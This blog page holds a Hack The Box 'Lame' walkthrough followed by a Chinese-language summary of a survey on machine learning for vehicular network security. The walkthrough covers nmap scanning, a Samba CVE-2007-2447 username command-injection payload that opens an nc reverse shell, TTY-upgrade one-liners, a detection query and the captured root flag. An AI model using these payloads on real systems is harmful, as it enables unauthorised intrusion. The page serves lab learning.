<p>first we need to know what the Machines open service</p>
<ul>
<li><p>IP 10.129.108.1</p>
</li>
<li><p>OS Parrot</p>
</li>
<li><p>nmap -sV -Pn -A -sC 10.129.108.1</p>
</li>
<li><p>nmap -p 1-65535 -T4 -A -v 10.129.108.1</p>
</li>
</ul>
<p><img src="/img/lame_Untitled.png" alt="Untitled"></p>
<p><img src="/img/lame_Untitled_1.png" alt="Untitled"></p>
<p><img src="/img/lame_Untitled_2.png" alt="Untitled"></p>
<p><img src="/img/lame_Untitled_3.png" alt="Untitled"></p>
<p><img src="/img/lame_Untitled_4.png" alt="Untitled"></p>
<p>Now we can see the open port is:</p>
<ul>
<li>21&#x2F;tcp vsftpd 2.3.4 ftp service</li>
<li>22&#x2F;tcp Openssh 4.7p1 Debian 8ubuntu1 (protocol 2.0) SSH</li>
<li>445&#x2F;tcp Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)  netbios-ssn</li>
</ul>
<p>One of the FTP services allows guests to login</p>
<p><img src="/img/lame_Untitled_5.png" alt="Untitled"></p>
<p>So I try using anonymous login FTP service，but the content is empty</p>
<p><img src="/img/lame_Untitled_6.png" alt="Untitled"></p>
<p>Then I decided to look for vulnerabilities in this service version</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49757">Offensive Security’s Exploit Database Archive</a></p>
<p>The exploit-db  platform has seen this version of the vulnerability message </p>
<p>And the vulnerability is <code>CVE-2011-2523</code></p>
<p>But I find some problem, this CVE cannot be used here, becouse I use the more exploit to try this CVE, So I guess “this topic” should not apply to this vulnerability</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://vulners.com/nmap/NMAP:FTP-VSFTPD-BACKDOOR.NSE">https://vulners.com/nmap/NMAP:FTP-VSFTPD-BACKDOOR.NSE</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/nobodyatall648/CVE-2011-2523">https://github.com/nobodyatall648/CVE-2011-2523</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/0xSojalSec/-CVE-2011-2523">https://github.com/0xSojalSec/-CVE-2011-2523</a></li>
</ul>
<p>Back to what I said earlier, in addition to FTP services, there are also SSH and SMB services</p>
<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-430455/Openbsd-Openssh-4.7p1.html">Openbsd Openssh version 4.7p1 : Security vulnerabilities</a></p>
<p>After searching for vulnerabilities in this version of SSH, I found no exploitable vulnerabilities, so I directly tested the SMB service</p>
<p>The SMB service has two ports opened</p>
<p><img src="/img/lame_Untitled_7.png" alt="Untitled"></p>
<p>When I browsed the exploit-db platform again, I found a lot of exploitable vulnerability information after looking for the Samba service. Among them, the 445 port targeted the vulnerability of smbd 3.0.20, and I also saw this vulnerability exploit information in the platform list.</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/16320">Offensive Security’s Exploit Database Archive</a></p>
<p><img src="/img/lame_Untitled_8.png" alt="Untitled"></p>
<p><img src="/img/lame_Untitled_9.png" alt="Untitled"></p>
<p>You can see that the CVE number is 2007-2447</p>
<p><a target="_blank" rel="noopener" href="https://www.samba.org/samba/security/CVE-2007-2447.html">Samba - Security Announcement Archive</a></p>
<p>The exploit needs to import the suite first from smb.SMBConnection import SMBConnection</p>
<p>So you have to download the smb for python3 first. If you use the pysmb tool, it will always report an error (for online HTB machines)</p>
<ul>
<li>sudo apt install python3-smb</li>
</ul>
<p>Because the During the OSCP exam  we can’t use MSF tool to help us complete the topic</p>
<p>Use the exploit is the good choose, but this doesn’t work for me</p>
<p><a target="_blank" rel="noopener" href="https://github.com/amriunix/CVE-2007-2447">https://github.com/amriunix/CVE-2007-2447</a></p>
<p>So I decided not to test this way</p>
<p>(Here I changed the IP)</p>
<p>first I want to know the smb service if I use Anonymous identity to login the SMB it can be access?</p>
<p><img src="/img/lame_Untitled_10.png" alt="Untitled"></p>
<p>as i guessed</p>
<p>The smb exploit</p>
<ul>
<li>logon “&#x2F;&#x3D;<code>nc ‘tun0 interface IP’ 4444 -e /bin/bash</code>”</li>
</ul>
<p><img src="/img/lame_Untitled_11.png" alt="Untitled"></p>
<p><img src="/img/lame_Untitled_12.png" alt="Untitled"></p>
<p>I think this method is Failed</p>
<p>So want to try other payload</p>
<p><a target="_blank" rel="noopener" href="https://oscp.infosecsanyam.in/untitled/smb-enumeration">SMB Enumeration</a></p>
<ul>
<li><p>logon “.&#x2F;&#x3D;<code>nohup nc -e /bin/sh LHOST LPORT</code>“</p>
<p>  <img src="/img/lame_Untitled_13.png" alt="Untitled"></p>
</li>
</ul>
<p>when I use this payload, the nc well return the <strong>connect to [10.10.14.9] from (UNKNOWN) [10.129.109.152] 39109</strong> message to me</p>
<p><img src="/img/lame_Untitled_14.png" alt="Untitled"></p>
<p>So I decide to try some command under nc</p>
<p><img src="/img/lame_Untitled_15.png" alt="Untitled"></p>
<p>In order to be fully interactive in this simple reverse shell environment, I use the interactive terminal generated by Python</p>
<ul>
<li><p>TTY</p>
<p>  There a command exists called <strong>tty</strong> which displays information related to <strong>terminal</strong>. The <strong>tty</strong>  command of terminal basically prints the file name of the terminal connected to standard input. <strong>tty</strong> is short of teletype, but popularly known as a terminal it allows you to interact with the system by passing on the data (you input) to the system, and displaying the output produced by the system.</p>
<p>  <a target="_blank" rel="noopener" href="https://ppfocus.com/0/teae6b945.html">Spawning A TTY Shell-逃逸 Linux 各種 Shell 來執行命令 - 人人焦點</a></p>
</li>
</ul>
<p>Attackers may upgrade a simple reverse shell to a fully interactive <code>tty</code> after obtaining initial access to a host.</p>
<p><strong>Spawning a TTY Shell</strong></p>
<ul>
<li>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;sh”)’</li>
<li>echo os.system(‘&#x2F;bin&#x2F;bash’)</li>
<li>&#x2F;bin&#x2F;sh -i</li>
<li>perl —e ‘exec “&#x2F;bin&#x2F;sh”;’</li>
<li>perl: exec “&#x2F;bin&#x2F;sh”;</li>
<li>ruby: exec “&#x2F;bin&#x2F;sh”</li>
<li>lua: os.execute(‘&#x2F;bin&#x2F;sh’)</li>
<li>exec “&#x2F;bin&#x2F;sh”</li>
</ul>
<p><img src="/img/lame_Untitled_16.png" alt="Untitled"></p>
<h3 id="Rule-query"><a href="#Rule-query" class="headerlink" title="Rule query"></a>Rule query</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event.action:executed and process.name:python and</span><br><span class="line">process.args:(&quot;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&quot; or &quot;import pty;</span><br><span class="line">pty.spawn(\&quot;/bin/dash\&quot;)&quot; or &quot;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&quot;)</span><br></pre></td></tr></table></figure>

<p>when I execution python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;sh”)’ </p>
<p>I well got the fully interactive, it let me easy to operate</p>
<p><img src="/img/lame_Untitled_17.png" alt="Untitled"></p>
<ul>
<li>cat &#x2F;root&#x2F;root.txt ⇒ ffed091dd44f75f11cb90d85bb1ca752</li>
</ul>
<p><img src="/img/lame_Untitled_18.png" alt="Untitled"></p>
<p>To be honest, I searched for flag’s file for a long time, because it doesn’t have a fixed file name and location.</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Machine_Learning_for_Security in_Vehicular_Net_wor" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Machine_Learning_for_Security%20in_Vehicular_Net_wor/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.086Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Machine_Learning_for_Security%20in_Vehicular_Net_wor/">
        Machine Learning for Security in Vehicular Networks A Comprehensive Survey
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Machine-Learning-for-Security-in-Vehicular-Net-works-A-Comprehensive-Survey"><a href="#Machine-Learning-for-Security-in-Vehicular-Net-works-A-Comprehensive-Survey" class="headerlink" title="Machine_Learning_for_Security in_Vehicular_Net_works_A_Comprehensive_Survey"></a>Machine_Learning_for_Security in_Vehicular_Net_works_A_Comprehensive_Survey</h1><p>車聯網資安調查 upstream security <a target="_blank" rel="noopener" href="https://upstream.auto/">https://upstream.auto/</a></p>
<p>標題：車輛網絡安全機器學習技術綜合調查</p>
<p><img src="/img/vehicle_Untitled.png" alt="Structure of this Survey"></p>
<p>Structure of this Survey</p>
<p>介紹：</p>
<ul>
<li>車載網絡容易受到各種安全攻擊</li>
</ul>
<blockquote>
<p>由於多種原因，車載網絡容易受到各種安全攻擊。 首先，車載網絡是高度動態和異構的，具有大量的設備和通信協議。 這種複雜性使得確保網絡安全和檢測潛在威脅變得困難。 其次，車載網絡經常傳輸位置、駕駛員身份和車輛狀態等敏感信息，攻擊者可以利用這些信息發動攻擊或危及乘客的安全。 最後，車載網絡本質上是資源受限和移動的，這使得實施不影響網絡性能或可用性的有效安全解決方案具有挑戰性。</p>
</blockquote>
<blockquote>
<p>本文確定了幾個可能影響車輛網絡安全的關鍵攻擊問題。 這些包括：</p>
<blockquote>
<p>對抗性攻擊Adversarial attacks：對抗性攻擊可以操縱車輛安全解決方案中使用的 ML 算法的輸入數據，從而導致不正確的預測或決策。</p>
</blockquote>
<blockquote>
<p>中毒攻擊Poisoning attacks：中毒攻擊可以操縱用於訓練車輛安全解決方案中 ML 算法的訓練數據，從而導致做出錯誤預測或決策的有偏見的模型。</p>
</blockquote>
<blockquote>
<p>干擾攻擊Jamming attacks：干擾攻擊可以通過在通信信道上傳輸噪聲來破壞車輛之間或車輛與基礎設施之間的通信。</p>
</blockquote>
<blockquote>
<p>竊聽攻擊Eavesdropping attacks：竊聽攻擊可以攔截車輛之間或車輛與基礎設施之間的通信，以獲取位置或駕駛員身份等敏感信息。</p>
</blockquote>
<blockquote>
<p>Sybil 攻擊Sybil attacks：Sybil 攻擊涉及在車載網絡中創建多個假身份以發起其他類型的攻擊，例如乾擾或竊聽。</p>
</blockquote>
<blockquote>
<p>拒絕服務 (DoS) 攻擊Denial-of-service (DoS) attacks：DoS 攻擊涉及用流量或請求淹沒系統以破壞其正常運行。</p>
</blockquote>
<blockquote>
<p>中間人 (MitM) 攻擊Man-in-the-middle (MitM) attacks：MitM 攻擊涉及攔截兩方之間的通信並將其更改為惡意目的。</p>
</blockquote>
</blockquote>
<p><img src="/img/vehicle_Untitled_1.png" alt="Taxonomy of attacks in vehicular network"></p>
<p>Taxonomy of attacks in vehicular network</p>
<table>
<thead>
<tr>
<th>Attack</th>
<th>Countermeasures</th>
<th>Violated security services</th>
</tr>
</thead>
<tbody><tr>
<td>denial of service attacks</td>
<td>• use pre-authentication scheme</td>
<td></td>
</tr>
<tr>
<td>• use an attacked packet detection algorithm</td>
<td>• availability</td>
<td></td>
</tr>
<tr>
<td>Jamming attack</td>
<td>• use threshold-based jamming countermeasure technique</td>
<td></td>
</tr>
<tr>
<td>• use the frequency hopping technique</td>
<td>• availability</td>
<td></td>
</tr>
<tr>
<td>Malware attack</td>
<td>• installing anti-malware applications</td>
<td></td>
</tr>
<tr>
<td>• installing basic internet security applications</td>
<td>• availability</td>
<td></td>
</tr>
<tr>
<td>broadcast tampering attack</td>
<td>• use digital signatures</td>
<td>• availability</td>
</tr>
<tr>
<td>Spamming attack</td>
<td>• embedded anti-malware frameworks</td>
<td>• availability</td>
</tr>
<tr>
<td>greedy behaviour attack</td>
<td>• use watchdogs</td>
<td></td>
</tr>
<tr>
<td>• use instrusion detection systems</td>
<td>• availability</td>
<td></td>
</tr>
<tr>
<td>Blackhole attack</td>
<td>• use detection, prevention and reactive AODV protocol</td>
<td></td>
</tr>
<tr>
<td>• use BAMBi technique</td>
<td>• availability</td>
<td></td>
</tr>
<tr>
<td>Eavesdropping attack</td>
<td>• use encryption techniques</td>
<td>• confidentiality</td>
</tr>
<tr>
<td>traffic analysis</td>
<td>• use encryption techniques</td>
<td></td>
</tr>
<tr>
<td>• use VIPER technique for V2I communications</td>
<td>• confidentiality</td>
<td></td>
</tr>
<tr>
<td>man in the middle attack</td>
<td>• use strong authentication methods</td>
<td></td>
</tr>
<tr>
<td>• use Hash functions</td>
<td>• confidentiality</td>
<td></td>
</tr>
<tr>
<td>social attack</td>
<td>• use digital signatures</td>
<td>• confidentiality</td>
</tr>
<tr>
<td>Sybil attack</td>
<td>• use a timestamp series approach</td>
<td></td>
</tr>
<tr>
<td>• use a distributed and robust approach</td>
<td>• authentication</td>
<td></td>
</tr>
<tr>
<td>Masqurading</td>
<td>• do not save passwords on computers</td>
<td></td>
</tr>
<tr>
<td>• change passwords on a regular basis</td>
<td></td>
<td></td>
</tr>
<tr>
<td>• use long and hard to guess passwords</td>
<td>• authentication and data integrity</td>
<td></td>
</tr>
<tr>
<td>replay attack</td>
<td>• use a globally synchronised time for all nodes</td>
<td></td>
</tr>
<tr>
<td>• use time stamps or nonce</td>
<td>• authentication and data integrity</td>
<td></td>
</tr>
<tr>
<td>impersonation attack</td>
<td>• use secure and privacy enhancing communications schemes</td>
<td></td>
</tr>
<tr>
<td>• use digital certificates</td>
<td>• authentication</td>
<td></td>
</tr>
<tr>
<td>GPS spoofing attack and tunnelling attack</td>
<td>• analyse of signal strength distribution between transmitted and received signals</td>
<td>• authentication</td>
</tr>
<tr>
<td>message tampering</td>
<td>• use hashing techniques</td>
<td></td>
</tr>
<tr>
<td>• use digital signatures</td>
<td></td>
<td></td>
</tr>
<tr>
<td>• use strong authorisation</td>
<td>• authentication</td>
<td></td>
</tr>
<tr>
<td>key and&#x2F;or certificate replication</td>
<td>• use strong authentication</td>
<td></td>
</tr>
<tr>
<td>• aavoid sharing of keys</td>
<td>• authentication</td>
<td></td>
</tr>
<tr>
<td>free-riding attack with fake authentication efforts</td>
<td>• use strong authentication</td>
<td>• authentication</td>
</tr>
<tr>
<td>message modification attack</td>
<td>• use digital signatures</td>
<td>• data integrity</td>
</tr>
<tr>
<td>illusion attack</td>
<td>• use trusted hardware</td>
<td>• data integrity</td>
</tr>
<tr>
<td>repudiation attack</td>
<td>• use digital signatures</td>
<td></td>
</tr>
<tr>
<td>• use PKC-based pseudo-IDs</td>
<td>• non-repudiation</td>
<td></td>
</tr>
</tbody></table>
<h3 id="Security-Attacks-and-Requirements"><a href="#Security-Attacks-and-Requirements" class="headerlink" title="Security Attacks and Requirements"></a>Security Attacks and Requirements</h3><ul>
<li><p>Hardware or software (HW&#x2F;SW)-based attacks: 這些攻擊針對車輛網絡的硬體或軟體組件，例如電子控制單元 (ECU) 或固件。 基於硬體&#x2F;軟體的攻擊示例包括拒絕服務 (DoS) 攻擊、惡意軟體注入或緩衝區溢出。</p>
<ul>
<li>Bogus Information：在這種類型的攻擊中，攻擊者發送一段偽造或錯誤的信息來誤導車輛中硬體或軟體系統的功能。</li>
<li>Timming Attack：是一種邊信道攻擊，通過分析密碼算法的執行時間來破壞系統的安全性。</li>
<li>Message Forgery：發起此類攻擊是為了欺騙收件人關於真實發件人的信息。</li>
<li>Replay Attack：這種攻擊也稱為回放攻擊，其中有效或真實數據的傳輸被惡意重複或延遲以誤導系統的功能。</li>
<li>Masquerading Attack:：這是一種攻擊形式，其中攻擊者使用虛假身份獲得對車輛系統的未授權訪問。</li>
<li>Node Impersonation：在這種類型的攻擊中，攻擊者竊取授權用戶的身份以獲得對系統的訪問權限。</li>
<li>GPS Spoofing：這種攻擊試圖通過在車輛周圍生成虛假信號來欺騙全球定位系統 (GPS)，其中 GPS 傳感器捕獲虛假信號並記錄虛假坐標，以誤導車輛網絡的功能。</li>
<li>Tampering Hardware : 這是一種通過提供虛假信息或在車輛周圍創建虛假環境來欺騙車輛硬體的攻擊類型。</li>
<li>Routing Attack : 這種攻擊導致路由過程的不正常運行。 路由攻擊進一步分為不同的攻擊，對應於網絡中不同級別的路由過程的故障。 在硬體方面，節點的存在和位置的錯誤通信可能會影響網絡中的路由表</li>
</ul>
</li>
<li><p>Infrastructure-based attacks: 這些攻擊針對車輛網絡的基礎設施組件，例如路邊單元 (RSU) 或雲服務器。 基於基礎設施的攻擊示例包括中間人 (MitM) 攻擊、重放攻擊或女巫攻擊。</p>
<ul>
<li>Repudiation Attack：他的攻擊發生在應用層，由於惡意操作，系統無法控制操作日誌和節點跟踪。 它也被稱為拒絕系統中的動作的行為。</li>
<li>Platoon Attack：Platoon 是一種將在同一車道上行駛的車輛分組在一起的概念，這些車輛之間的距離很近且速度規則相似。 攻擊者為破壞排的功能而採取的任何類型的行動</li>
<li>Session Hijacking：會話劫持是一種攻擊類型，攻擊者試圖劫持並訪問車輛和目標節點之間建立的數據傳輸會話。</li>
<li>Key-Certificate Replication：在這種攻擊中，攻擊者使用合法用戶的重複密鑰和證書來欺騙 TA 並獲得對網絡的訪問權限。</li>
<li>Unauthorized Access：這是對車輛網絡身份驗證系統的攻擊。在這種攻擊中，攻擊者試圖通過破壞其身份驗證參數來訪問車輛節點系統、服務器、控制器或網絡的任何其他組件，例如 解密系統帳戶的登錄標識 (ID) 和密碼。</li>
</ul>
</li>
<li><p>Sensor-based attacks: 這些攻擊針對車載網絡的傳感器組件，例如攝像頭或激光雷達。 基於傳感器的攻擊示例包括欺騙、干擾或物理篡改。</p>
<ul>
<li>Illusion Attack：在這種攻擊中，敵方車輛欺騙自己的傳感器產生錯誤的讀數並傳輸到網絡。 這會在道路上產生虛假的場景錯覺，以誤導其他車輛並生成錯誤的警告信息。</li>
<li>Jamming Attack：在這種攻擊中，干擾器的目的是通過發送虛假警報或在傳感器周圍創建欺騙環境來阻止或乾擾來自傳感器的數據傳輸</li>
</ul>
</li>
<li><p>Wireless communication-based attacks: 這些攻擊針對車輛用於相互通信或與基礎設施組件通信的無線通信信道。 基於無線通信的攻擊示例包括竊聽、消息修改或位置跟踪。</p>
<ul>
<li>Brute-Force Attack：這是對用於在 V2X 通信中傳輸數據的無線協議的身份驗證系統的攻擊。 對手運行暴力算法來創建不同的密碼或密碼組合，以打破對媒體的訪問。</li>
<li>Spoofing Attack：在車載應用中，可能會發生一種不同類型的欺騙攻擊，其中攻擊者偽裝成網絡的合法用戶以獲取對個人信息的訪問權限。 欺騙攻擊不僅限於身份欺騙，還包括位置、域名服務器 (DNS) 信息、互聯網協議 (IP) 地址等。</li>
<li>ID Fingerprinting：在車載網絡中，對駕駛員進行正確識別和真實分析以防止汽車被黑客入侵和盜竊至關重要。 在 ID 指紋識別中，攻擊者旨在<br>  獲取驅動程序配置文件並使用它對系統發起攻擊。</li>
<li>Location Trailing：這種攻擊通過非法訪問傳輸車輛個人信息的通道來侵犯隱私。 在這裡，對手可以跟踪目標車輛的完整路徑並跟踪其位置。</li>
<li>Sybil Attack：Sybil 攻擊是最常見且易於實施的攻擊之一。 車載網絡中的女巫攻擊會創建虛擬節點以發起攻擊，並且檢測此類虛擬節點並不容易。</li>
<li>Denial of Service (DoS)：這是一種難以應對且實施頻率很高的攻擊。 在這種攻擊中，攻擊者通過服務器或任何其他節點發起大量欺騙請求以進行<br>  它完全佔用了不必要的請求並阻止了對合法用戶的訪問。</li>
<li>Spamming Attack : 在這種攻擊中，攻擊者發送大量垃圾郵件以消耗網絡帶寬並增加數據傳輸的延遲。</li>
<li>Jamming Attack : 在這種攻擊中，干擾器的目的是通過佔用信道或發送虛假警報來阻止或乾擾授權傳輸。</li>
<li>Grey-Hole and Black-Hole Attack : 黑洞和灰洞攻擊是無線路由攻擊的類型。 在這些攻擊中，節點試圖停止向接收方轉發消息&#x2F;數據包。 在黑洞攻擊中，將完全中斷或丟包。 然而，在灰洞攻擊中，會發生部分數據包丟失，部分數據包被攻擊者更改以向接收方傳達錯誤信息。</li>
</ul>
<p>  <img src="/img/vehicle_Untitled_2.png" alt="Untitled"></p>
<ul>
<li>Man-in-the-Middle (MiTM) Attack : 在 MiTM 中，攻擊者通過攔截信道聽到兩個節點之間正在進行的通信，並假裝是其中之一以錯誤信息回复。</li>
<li>Eavesdropping：這是一種嗅探攻擊，攻擊者在其中窺探兩個實體之間傳輸的信息。 在此攻擊中，它不會更改或回復任何實體，而只會偵聽和訪問個人信息。</li>
</ul>
</li>
<li><p>機器學習 (ML) 技術可用於檢測和防止這些攻擊</p>
<ol>
<li><p>監督學習Supervised learning：監督學習算法可以在標記數據上進行訓練，以檢測已知的攻擊並做出準確的預測或決策。</p>
<blockquote>
<p>在監督學習中，訓練數據集的每個條目都包含一個輸入值及其對應的標籤。 監督算法學習輸入樣本和訓練集標籤之間的關係，並使用它來映射測試數據的新實例 [17]。<br> 監督學習進一步分為classification and regression。</p>
<blockquote>
<p>classification模型的輸出是categorical or discrete的。 車載網絡安全性常用的分類模型有K-Nearest Neighbour (KNN) [105] [106], Decision Tree [107], Naive Bayes [108], Support Vector Machine (SVM) [109], and Neural Network (NN) [110]。</p>
</blockquote>
<blockquote>
<p>regression模型的輸出是一個連續值。 用於保護車輛網絡的最常見回歸模型是logistic regression [111], random forest [112], and NN [113]。</p>
</blockquote>
</blockquote>
<p> 在車載網絡中，監督學習的使用適用於不同的應用程序，例如駕駛員指紋識別、不當行為類型、攻擊檢測和信任計算（第四節）。</p>
</li>
<li><p>無監督學習Unsupervised learning：無監督學習算法可用於發現數據中可能指示以前未知攻擊的模式或異常。</p>
<blockquote>
<p>與監督學習相反，無監督學習僅在其訓練數據集中包含輸入值。 在無監督學習中，沒有為數據集使用預先分配的標籤。 無監督學習是從未標記的信息中找到數據的隱藏模式。 結果，類似結構的數據被聚類到同一組中。 無監督算法在數據處理方面高效且快速。</p>
</blockquote>
<ul>
<li>無監督算法分為聚類和降維應用。<ul>
<li>在clustering中，輸入樣本根據不同的相似性屬性（例如相對或絕對相似性）分組在一起。 通過隨機選擇聚類質心進行分組，並且從中心計算所有值的相似性屬性。 質心的選擇不斷變化，直到找到最佳匹配。 車載網絡中最常見的安全聚類機制是 k 均值聚類 [114]、隱馬爾可夫模型 (HMM) [115] 和神經網絡 [116]。</li>
<li>在dimensionality reduction中，數據在不丟失有用信息的情況下從高維投影到低維[17]。 降維技術優化速度更快，複雜度更低，但可能會降低學習過程。 在車載網絡的安全性方面，文獻 [117] 考慮了使用線性判別分析 (LDA) 作為降維機制。</li>
</ul>
</li>
</ul>
</li>
<li><p>強化學習Reinforcement learning(RL)：強化學習算法可以學習動態環境下安全決策的最優策略</p>
<blockquote>
<p>目標是學習一種策略，幫助代理在給定環境中採取最佳行動 [118]。 代理根據收到的獎勵生成要學習的數據，並嘗試通過使用試錯法與環境交互來最大化正獎勵。 環境是一個Markov decision process，其中獎勵和狀態轉移概率由觀察和動作選擇定義 [21]。 RL 的策略是找到最大化未來獎勵的動作。<br> 最流行和廣泛使用的 RL 方法之一是 Q-learning。 Q-learning 使用 Bellman equation作為約束來最大化累積獎勵 [118]。 它旨在通過應用動作選擇策略來最大化預期的獎勵總和。</p>
</blockquote>
<blockquote>
<p>在實踐中，Q-learning 會生成一個查找表來存儲動作和預期獎勵的組合。 這需要更大的內存，並且當對數據使用一組連續的操作時，有時會變得效率低下。 作為解決方案，提出了 DRL 網絡，它涉及 DL 和 RL 的組合以處理更大的數據集 [119]。RL、DRL 及其變體的使用被廣泛用於車載網絡的安全性。</p>
</blockquote>
</li>
</ol>
<p>  <img src="/img/vehicle_Untitled_3.png" alt="The conceptual framework of RL"></p>
<p>  The conceptual framework of RL</p>
<ol>
<li><p>深度學習Deep learning：深度學習算法如卷積神經網絡（CNNs）和遞歸神經網絡（RNNs）可用於分析大量數據並做出準確的預測或決策。</p>
<blockquote>
<p>DL 是 ML 的一個子集，但與傳統的 ML 算法形成對比。 它不像傳統 ML 那樣需要特徵工程。 在 DL 中，它通過算法的自我優化自行學習數據模式 [120]。<br> DL 找到傳統 ML 難以學習的模式。 原始數據以其原始形式（未經預處理）可以直接應用於深度學習算法進行分類、回歸和決策制定，無需顯式編程。</p>
</blockquote>
<blockquote>
<p>DL 非常適合非線性數據模式 [121]，它以監督、部分監督、無監督或強化的方式工作。</p>
</blockquote>
<blockquote>
<p>人工神經網絡 (ANN) 來自神經網絡的初始設計之一 [122]，而多層感知器 (MLP) 是最簡單和最常用的 ANN 版本 [123]。 MLP 也稱為feedforward-ANN。 MLP 是一種分層模型，由三部分組成，即輸入層、中間隱藏層或計算層以及輸出層。</p>
</blockquote>
<blockquote>
<p>MLP 可以建模為有監督或無監督的學習過程 [124]。 MLP由於採用fully-connected design，面臨low convergence efficiency and high working complexity的問題。 儘管存在這些缺點，ANN 架構仍用於 VANET [125] 中的駕駛員 ID 指紋識別、攻擊檢測和入侵檢測應用。</p>
</blockquote>
<blockquote>
<p>另一種變體，深度神經網絡 (DNN) 是具有deep (multiple) hidden layers的 ANN [126]。</p>
<p>使用deep structure of layers的優點是：</p>
<p>1)使設計兼容學習更大的數據集。</p>
<ol start="2">
<li>與淺層網絡相比，深度網絡學習更複雜的功能，</li>
</ol>
<p>3)深度網絡架構有助於實現更高的準確性 [127]。 另一方面，更深的網絡在處理時間和convergence方面引入了更高的複雜性。 根據optimization function and information flow，它可以進一步分為不同的類型。 </p>
<ol>
<li>Fully-Connected DNN (FCDNN) 由一系列層組成，其中每個輸入都連接到下一層的每個神經元，依此類推。 由於這種多樣化的連接性，它被稱為全連接網絡。</li>
<li>Convolutional Neural Network (CNN) 是文獻中流行且廣泛實施的 DNN 之一，它在多維數據方面取得了出色的性能。 它之所以被稱為 CNN，是因為它在其網絡設計 [127] 中的不同層使用了卷積的數學運算。 在 CNN [128] 中廣泛觀察到監督和非監督方法的使用。 這使得它有望在使用未標記數據集的入侵檢測系統 (IDS) 中得到應用。 CNN 具有良好訓練性能的優勢，由於weight sharing and pooling operations，它使用較少的參數。 CNN對語音、圖像等多維數據的處理效果最佳。</li>
<li>Recurrent Neural Network (RNN) 是一種遞歸 DNN，其中神經元使用feedback looping structure，其中神經元的新輸出取決於先前的輸出和當前輸入 [129]。 RNN 能夠隨時間存儲狀態。 有許多應用 CNN 不夠好，例如理解視頻（即圖像序列）或文本塊中的時間信息。 RNN 專門設計用於處理當前數據點與前一個數據點存在某種關係的序列數據。 長短期記憶 (LSTM) 是一種流行的 RNN 設計，廣泛用於生成長序列時間序列數據（例如交通流量、傳感器讀數和車輛軌跡）的車輛網絡。</li>
</ol>
</blockquote>
</li>
<li><p>集成方法Ensemble methods：集成方法如隨機森林或梯度提升可以結合多個 ML 模型以提高accuracy and robustness。</p>
</li>
<li><p>遷移學習Transfer learning：遷移學習技術可以利用預先訓練的模型或來自相關領域的知識來提高 ML 模型在檢測攻擊方面的性能。</p>
<p> <img src="/img/vehicle_Untitled_4.png" alt="The conceptual framework of TL"></p>
<p> The conceptual framework of TL</p>
</li>
<li><p>聯邦學習Federated learning : FL 是一種分佈式機器學習技術，它使多方能夠協作訓練模型而無需彼此共享數據。 在車載網絡環境中，FL 可用於訓練模型以檢測攻擊或異常，同時保護個別車輛生成的敏感數據的隱私。</p>
</li>
</ol>
<p>  <img src="/img/vehicle_Untitled_5.png" alt="The conceptual framework of FL"></p>
<p>  The conceptual framework of FL</p>
<p>  <img src="/img/vehicle_Untitled_6.png" alt="ML-BASED LITERATURE TO DETECT OR PREVENT ADVERSARIES AT
  DIFFERENT LEVELS OF COMMUNICATIONS"></p>
<p>  ML-BASED LITERATURE TO DETECT OR PREVENT ADVERSARIES AT<br>  DIFFERENT LEVELS OF COMMUNICATIONS
  </p>
</li>
<li><p>本文對基於 ML 的車載網絡安全技術進行了全面調查。</p>
  <aside>
  💡
  
<p>  本文側重於車載網絡安全，並從基於 ML 的解決方案的角度專門總結了這些工作。 作者首先介紹了車載網絡及其變體的基礎知識，以及採用各種技術（例如 5G、SDN、物聯網、邊緣計算和雲計算）來實現智能交通應用。 然後，他們提出了車載網絡的安全挑戰和要求。</p>
<p>  本文還研究了可用於檢測和防止對車載網絡的攻擊的不同類型的 ML 算法。 這些包括監督學習、無監督學習、強化學習、深度學習、集成方法和遷移學習。</p>
<p>  作者還討論了可能影響車載網絡安全的不同類型的攻擊。 這些包括對抗性攻擊、中毒攻擊、干擾攻擊、竊聽攻擊、Sybil 攻擊、DoS 攻擊和 MitM 攻擊。</p>
<p>  此外，本文研究了不同的方法來解決與使用基於 ML 的車載網絡安全解決方案相關的挑戰。 其中包括使用旨在提高計算效率且需要更少資源的輕量級 DL 模型； 使用傳統的 ML 算法，例如決策樹或支持向量機 (SVM)，其計算複雜度低於 DL 算法； 或將計算卸載到更強大的邊緣或霧節點。</p>
  </aside></li>
</ul>
<p><img src="/img/vehicle_Untitled_7.png" alt="The conceptual block diagram of a typical ML model."></p>
<p>The conceptual block diagram of a typical ML model.</p>
<p>車載網絡基礎：</p>
<ul>
<li><p>討論了網絡架構、車輛網絡的變體、用於數據傳輸的通信類型以及安全攻擊和要求的分類。</p>
<blockquote>
<p>網絡架構：本文討論了支持車輛網絡中智能交通應用的不同網絡架構。 其中包括 5G、軟體定義網絡 (SDN)、物聯網 (IoT)、邊緣計算和雲計算。</p>
</blockquote>
<blockquote>
<p>車輛網絡的變體：本文討論了車輛網絡的不同變體，包括車輛對車輛 (V2V) 通信、車輛對基礎設施 (V2I) 通信和車輛對一切 (V2X) 通信。</p>
</blockquote>
<p>  <img src="/img/vehicle_Untitled_8.png" alt="Variants of vehicular networks and related work"></p>
<p>  Variants of vehicular networks and related work</p>
<p>  <img src="/img/vehicle_Untitled_9.png" alt="VEHICULAR NETWORK VARIANTS AND ADVANTAGES"></p>
<p>  VEHICULAR NETWORK VARIANTS AND ADVANTAGES</p>
